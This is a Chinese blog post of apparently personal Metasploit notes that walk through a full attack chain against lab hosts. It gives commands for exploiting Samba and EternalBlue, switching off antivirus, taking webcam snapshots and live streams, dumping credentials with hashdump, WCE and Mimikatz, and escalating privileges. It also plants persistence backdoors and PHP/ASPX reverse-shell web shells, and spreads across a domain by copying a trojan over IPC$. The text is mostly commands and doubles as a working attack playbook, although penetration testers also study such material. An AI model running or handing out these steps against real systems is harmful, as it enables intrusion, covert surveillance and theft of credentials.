---
title: Metasploit实战基础
date: 2023-12-29 13:11:10
tags: 渗透测试
mathjax: true
---

# Metasploit实战基础

## 主机扫描

### 使用辅助模块

搜索可用端口模块：

```
search portscan
```

例如使用TCP扫描模块：

```
use auxiliary/scanner/portscan/tcp
```

查看需要设置的参数：

```
show options
```

设置参数：

set设置 unset取消设置 setg、unsetg设置全局参数

```
set RHOSTS 192.168.172.149
set PORTS 1-500
set THREADS 20
```

启动：

run或exploit

```
run
```

其他常用扫描模块：

| 模块        |         |               |                | 功能          |
| --------- | ------- | ------------- | -------------- | ----------- |
| auxiliary | scanner | portscan      |                | 端口扫描        |
|           |         | smb           | smb_version    | SMB系统版本扫描   |
|           |         |               | smb_enumusers  | SMB枚举       |
|           |         |               | smb_login      | SMB弱口令扫描    |
|           |         | smtp          | smtp_version   | SMTP版本扫描    |
|           |         |               | smtp_enum      | SMTP枚举      |
|           |         | snmp          | community      | SNMP扫描设备    |
|           |         | telnet        | telnet_login   | TELNET登录    |
|           |         | ssh           | ssh_login      | SSH登录测试     |
|           |         | mysql         | mysql_login    | MySQL弱口令扫描  |
|           | admin   | mysql         | mysql_enum     | MySQL枚举     |
|           |         |               | mysql_sql      | MySQL语句执行   |
|           |         | smb           | psexec_command | SMB登录且执行命令  |
| admin     | mssql   | mssql_enum    |                | MSSQL枚举     |
|           |         | mssql_exec    |                | MSSQL执行命令   |
|           |         | mssql_sql     |                | MSSQL查询     |
| scanner   | mssql   | mssql_ping    |                | MSSQL主机信息扫描 |
|           |         | mssql_login   |                | MSSQL弱口令扫描  |
|           | vnc     | vnc_none_auth |                | VNC空口令扫描    |

### 使用内嵌Nmap扫描

-Pn或-p0指不使用ping，假定所有主机存活，可穿waf，避免被waf发现。

```
nmap -O -Pn 192.168.31.250
```

## 漏洞利用

使用内嵌nmap扫描端口及服务：

```
nmap -sV 192.168.172.134
```

发现运行Samba 3.x服务，搜索Samba漏洞利用模块：

```
search samba
```

选择“Excellent”攻击模块：

```
info exploit/multi/samba/usermap_script
use exploit/multi/sambas/usermap_script
```

选择Linux攻击载荷，这里选择基础的反向攻击载荷：

```
set PAYLOAD cmd/unix/reverse
```

设置参数：

```
set RHOST 192.168.172.134
set RPORT 445
set LHOST 192.168.172.136
```

攻击：

```
exploit
```

## 进程迁移

### 手动迁移

在获得的Meterpreter Shell中获取目标机正在运行的进程：

```
ps
```

查看当前进程PID：

```
getpid
```

例如当前Meterpreter Shell进程PID为984，Explorer.exe进程PID为448，则迁移：

```
migrate 448
```

一般原进程会自动关闭，如果没有自动关闭可手动：

```
kill 984
```

### 自动迁移

```
run post/windows/manage/mirgrate
```

## 系统信息收集

查看系统信息，如操作系统，体系结构：

```
sysinfo
```

检查目标机是否运行在虚拟机上：

```
run post/windows/gather/checkvm
```

检查目标机最近运行时间：

```
idletime
```

查看完整的网络设置：

```
route
```

查看渗透成功的用户名，如果不是最高权限，则需要提权：

```
getuid
```

关闭目标机系统杀毒软件：

```
run post/windows/manage/killav
```

启动目标机的远程桌面协议：

```
run post/windows/manage/enable_rdp
```

查看目标机本地子网：

```
run post/windows/manage/autoroute
```

添加路由：

```
background
route add 192.168.172.0 255.255.255.0 1
route print
```

列举登录了目标机的用户：

```
run post/windows/gather/enum_logged_on_users
```

列举安装在目标机上的应用程序：

```
run post/windows/gather/enum_application
```

抓取自动登录的用户名密码：

```
run windows/gather/credentials/windows_autologin
```

如果抓不到，使用Espia抓取屏幕截图，保存到/root下：

```
load espia
screengrab #screengrab或screenshot
```

查看目标机是否由摄像头：

```
webcam_list
```

打开摄像头，拍一张照片，保存到/root下：

```
webcam_snap
```

摄像头开启直播模式，.html保存到/root下，浏览器打开即可：

```
webcam_stream
```

进入目标机Shell，退出exit：

```
shell
```

## 文件系统

查看处于目标机哪个目录：

```
pwd #或getwd
```

查看本地处于哪个目录：

```
getlwd
```

列出当前目录所有文件：

```
ls
```

切换目录：

```
cd c:\
```

搜索C盘中以.txt为扩展名的文件，-f用于指定搜索文件，-d指定哪个目录下：

```
search -f *.txt -d c:\
```

下载目标机C盘test.txt到攻击机root下：

```
download c:\test.txt /root
```

上传攻击机root下test.txt到目标机C盘下：

```
upload /root/test.txt c:\
```

## 权限提升

在目标机Shell中（Windows）：

```bash
whoami /groups
```

看到最后一个组为：Mandatory Label\Medium Mandatory Level，提权目标为Mandatory Label\High Mandatory Level。

尝试自动提权（一般不会成功）：

```
getsystem
```

### WMIC法

查看系统打的补丁。法一：在目标机Shell中输入systeminfo；法二：查询C:\Windows\留下的补丁号.log。法三：利用WMIC：

```
Wmic qfe get Caption.Description.HotFixID.InstalledOn
```

想办法找到没有补丁编号的Exp提权，推荐网站：http://www.securityfocus.comd/bid和http://www.exploit-db.com。

这里使用没有安装补丁的漏洞：MS16-032(KB3139914)，进行提权：

```
background #从meterpreter切换回msfconsole
search ms16_032
use windows/local/ms16_032_secondary_logon_handle_privesc
set session 1
run
```

在Meterpreter Shell中，System权限：

```
getuid
```

常见系统补丁号：

| Windows 2003 |                            | Windows 2008 |                             | Windows 2012 |                             |
| ------------ | -------------------------- | ------------ | --------------------------- | ------------ | --------------------------- |
| KB2360937    | MS10-084                   | KB3139914    | MS16-032                    | KB3139914    | MS16-032                    |
| KB2478960    | MS11-014                   | KB3124280    | MS16-016                    | KB3124280    | MS16-016                    |
| KB2507938    | MS11-056                   | KB3134228    | MS16-014                    | KB3134228    | MS16-014                    |
| KB2566454    | MS11-062                   | KB3079904    | MS15-097                    | KB3079904    | MS15-097                    |
| KB2646524    | MS12-003                   | KB3077657    | MS15-077                    | KB3077657    | MS15-077                    |
| KB2645640    | MS12-009                   | KB3045171    | MS15-051                    | KB3045171    | MS15-051                    |
| KB2641653    | MS12-018                   | KB3000061    | MS14-058                    | KB3000061    | MS14-058                    |
| KB944653     | MS07-067                   | KB2829361    | MS13-046                    | KB2829361    | MS13-046                    |
| KB952004     | MS09-012 PR                | KB2850851    | MS13-053EPATHOBJ 0day  限32位 | KB2850851    | MS13-053EPATHOBJ 0day  限32位 |
| KB971657     | MS09-041                   | KB2707511    | MS12-042 sysret -pid        | KB2707511    | MS12-042 sysret -pid        |
| KB2620712    | MS11-097                   | KB2124261    | KB2271195  MS10-065 IIS7    | KB2124261    | KB2271195  MS10-065 IIS7    |
| KB2393802    | MS11-011                   | KB970483     | MS09-020IIS6                | KB970483     | MS09-020IIS6                |
| KB942831     | MS08-005                   |              |                             |              |                             |
| KB2503665    | MS11-046                   |              |                             |              |                             |
| KB2592799    | MS11-080                   |              |                             |              |                             |
| KB956572     | MS09-012烤肉                 |              |                             |              |                             |
| KB2621440    | MS12-020                   |              |                             |              |                             |
| KB977165     | MS10-015Ms Viru            |              |                             |              |                             |
| KB3139914    | MS16-032                   |              |                             |              |                             |
| KB3124280    | MS16-016                   |              |                             |              |                             |
| KB3134228    | MS16-014                   |              |                             |              |                             |
| KB3079904    | MS15-097                   |              |                             |              |                             |
| KB3077657    | MS15-077                   |              |                             |              |                             |
| KB3045171    | MS15-051                   |              |                             |              |                             |
| KB3000061    | MS14-058                   |              |                             |              |                             |
| KB2829361    | MS13-046                   |              |                             |              |                             |
| KB2850851    | MS13-053EPATHOBJ 0day 限32位 |              |                             |              |                             |
| KB2707511    | MS12-042  sysret -pid      |              |                             |              |                             |
| KB2124261    | KB2271195  MS10-065 IIS7   |              |                             |              |                             |
| KB970483     | MS09-020IIS6               |              |                             |              |                             |

### 令牌窃取法

列出可用Token：

```
use icognito
list_tokens -u
```

授权令牌Delegation Tokens支持交互式登录，模拟令牌Impersonation Tokens支持非交互会话。

例如分配的有效令牌包含：WIN-57TJ4B561MT\Administrator，则假冒Administrator进行攻击：

```
impersonate_token WIN-57TJ4B561MT\\Administrator #双斜杠
whoami #管理员
```

### Hash攻击

#### Hashdump

如果不是System权限，以下直接导出sam文件会失败：

```
hashdump
```

如果目标机为Win7且开启UAC，则绕过：

```
run windows/gather/smart_hashdump
```

暴力或彩虹表对Hash破解，推荐：http://www.cmd5.com和http://www.xmd5.com。

#### Ntscan

先制作字典，暴力破解字典：真空密码字典生成器，社会工程学字典：亦思社会工程学字典生成器

Ntscan爆破即可。

#### GetPass

只针对Win2003，运行即可。

#### Quarks PwDump

```bash
QuarksPwDump.exe -dhl -o 1.txt
```

在SAMInside中Import from PWDUMP File..打开即可。

#### Windows Credentials Editor

上传并查看已登录的明文密码：

```
upload /root/wce.exe c:\
shell
cd /
wce.exe -w
```

-w查看密码明文；-f强制安全方法读取，默认先安全后不安全，不安全方法会破坏系统；-g用系统使用的加密算法加密一个明文的密文；-c执行mcd；-v显示详细信息（LUID）。

#### Mimikatz

Win2000和WinXP下不好使。查看目标机架构为32位：

```
sysinfo
```

MSF自带，加载mimikatz模块：

```
load mimikatz
help mimikatz
```

试探Mimikatz大概使用方式：

```
mimikatz_command -f a:: #随便输入模块a，报错，查看所有模块
mimikatz_command -f hash:: #查看hash模块下选项
```

先使用自带命令获取系统信息：

```
msv #系统Hash
kerberos #抓取系统票据
wdigest #系统账户信息
```

抓取Hash：

```
mimikatz_command -f samdump:: #试探samdump可用选项
mimikatz_command -f samdump::hashes
```

抓取Hash后CMD5解密即可。

Mimikatz的其他功能：

查看系统进程，handle可list/kill：

```
mimikatz_command -f handle::list
```

查看系统服务，service模块可list/start/stop/remove：

```
mimikatz_command -f service::list
```

查看系统证书，crypto模块可list/export：

```
mimikatz_command -f crypto::listProviders
```

## Exploit移植

示例：MS17-010永恒之蓝在Metasploiit上已经集成，但不支持Win2003，Github上下载：https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit

Ruby脚本存放位置：/usr/share/metasploit-framework/modules/exploits/windows/smb

在MSF下重新加载所有文件：

```
reload_all
```

加载该模块：

```
search eternalblue-doublepulsar
use exploit/windows/smb/eternalblue_doublepulsar
```

攻击前先生成个DLL，目标机架构32位就生成32位的DLL，64位就64位DLL。用Msfvenom生成：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.31.247 lport=4444 -f dll -o ~/eternal11.dll #64位
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.19.186.17 -f dll -o ~/eternal11.dll #32位
```

按照实际设置参数：

```
set processinject lsass.exe
set rhost 192.168.12.108
set targetarchitecture x86
set winepath /root/.wine/drive_c #默认DLL生成文件夹，可改
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.12.110
set lport 4444 #不可改
set target 9
```

攻击后得到Meterpreter会话：

```
exploit #或run
```

## 后门植入

### Cymothoa后门

将Cymothoa可执行程序上传到目标主机上。

在Bash中，先利用ps -aux或tasklist查看选择哪个宿主进程及其PID。例如PID为982的进程为宿主进程，服务端口4444，第一类ShellCode：

```bash
cymothoa -S #列出具体各类ShellCode
cymothoa -p 982 -s 1 -y 4444
```

成功后直接连接：

```bash
nc -nvv 192.168.31.247 4444
```

### Persistence后门

先关闭目标机器杀毒软件。在Meterpreter中，查看帮助：

```
run persistence -h
```

创建持久性后门。-A自启动Payload，-S系统启动时自加载，-U用户登陆时自启动，-X开机自启动，-i回连时间间隔，-P监听反向连接端口号，-r目标IP地址。

```
run persistence -A -S -U -i 60 -p 4321 -r 192.168.172.138
```

查看成功获取的会话：

```
sessions
```

## WebShell

### Meterpreter后门

-p设置Payload，-f输出文件格式，制作PHP Meterpreter：

```bash
msfvenom -p php/meterpreter/reverse tcp lhost=192.168.31.247 -f raw > shuteer.php
```

想办法把shuteer.php上传到/var/www/html，启动MSF，设置监听：

```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.31.247
run
```

打开http://127.0.0.1/shuteer.php，MSF下服务端反弹成功。

### Aspx Meterpreter后门

操作同上：

```
show payloads
use windows/shell_reverse_tcp
info
set lhost 192.168.31.247
set lport 4444
save
```

查看帮助并生成：

```
generate -h
generate -t asp #asp版
generate -t aspx #aspx版
```

代码直接输出到控制台了，复制保存为文件，比如aspx.aspx，想办法上传到C:\inetpub\wwwroot目录，启动MSF，设置监听：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.31.247
set lport 4444
run
```

打开目标机的aspx.aspx，MSF服务端反弹成功。

## 内网攻击域渗透测试实例

### 信息收集

Windows下：

```bash
ipconfig
net user /domain #查看域用户
net view /domain #查看有几个域
net view /domain:XXX #查看域内的主机
net group /domain #查看域里面的组
net group "domain computers" /domain #查看域内所有的主机名
net group "domain admins" /domain #查看域管理员
net group "domain controllers" /domain #查看域控制器
net group "enterprise admins" /domain #查看企业管理组
net time /domain #查看时间服务器
```

### IPC$渗透

用net user得知自己主机名，用net view找一个跟自己机器名相近的服务器尝试：

```bash
net use \\PAVMSEP131\s$
copy bat.bat \\PAVMSEP131\c$ #bat.bat为免杀的Payload
net time \\PAVMSEP131 #查看目标主机的时间
at \\PAVMSEP131 16:15:00 c:\bat.bat #设置某事件启动木马
```

启动后发现进入Meterpreter Shell，查看当前用户：

```
getuid
```

如果发现没有System权限，需要利用如Mimikatz等提权。如果目标机为64位，需要将Mimikatz进程迁移到64位程序中才能看到密码明文：

```
upload /home/64.exe c:\
shell 
cd \
64.exe
net user joao.gerino /domain #查看域用户权限
```
